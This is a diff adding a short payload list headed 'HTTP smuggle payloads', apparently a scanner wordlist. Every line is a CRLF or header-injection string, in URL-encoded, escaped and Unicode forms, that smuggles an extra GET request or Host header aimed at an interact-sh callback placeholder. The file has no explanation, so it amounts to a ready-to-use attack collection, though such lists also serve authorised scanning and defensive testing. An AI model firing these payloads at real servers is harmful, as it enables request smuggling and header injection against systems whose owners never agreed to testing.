@@ -1,0 +1,14 @@
+# HTTP smuggle payloads
+# Each payload targets the interact-sh server defined by the __INTERACTSH_PAYLOAD__ environment variable
+__INTERACTSH_PAYLOAD__
+http://__INTERACTSH_PAYLOAD__
+%00GET / HTTP/1.1%0d%0aHost: __INTERACTSH_PAYLOAD__%0d%0a%0d%0a
+%0d%0aGET / HTTP/1.1%0d%0aHost: __INTERACTSH_PAYLOAD__%0d%0a%0d%0a
+\u000a\u000dGET / HTTP/1.1\u000a\u000dHost: __INTERACTSH_PAYLOAD__\u000a\u000d\u000a\u000d
+\r\nGET / HTTP/1.1\r\nHost: __INTERACTSH_PAYLOAD__\r\n\r\n
+ HTTP/1.1\r\nHost: __INTERACTSH_PAYLOAD__\r\n\r\n
+\r\nHost: __INTERACTSH_PAYLOAD__\r\n\r\n
+%20HTTP/1.1%0d%0aHost: __INTERACTSH_PAYLOAD__%0d%0a%0d%0a
+%0d%0aHost:%20__INTERACTSH_PAYLOAD__%0d%0a%0d%0a
+\u0020HTTP/1.1\u000d\u000aHost: __INTERACTSH_PAYLOAD__\u000d\u000a\u000d\u000a
+\u000d\u000aHost: __INTERACTSH_PAYLOAD__\u000d\u000a\u000d\u000a
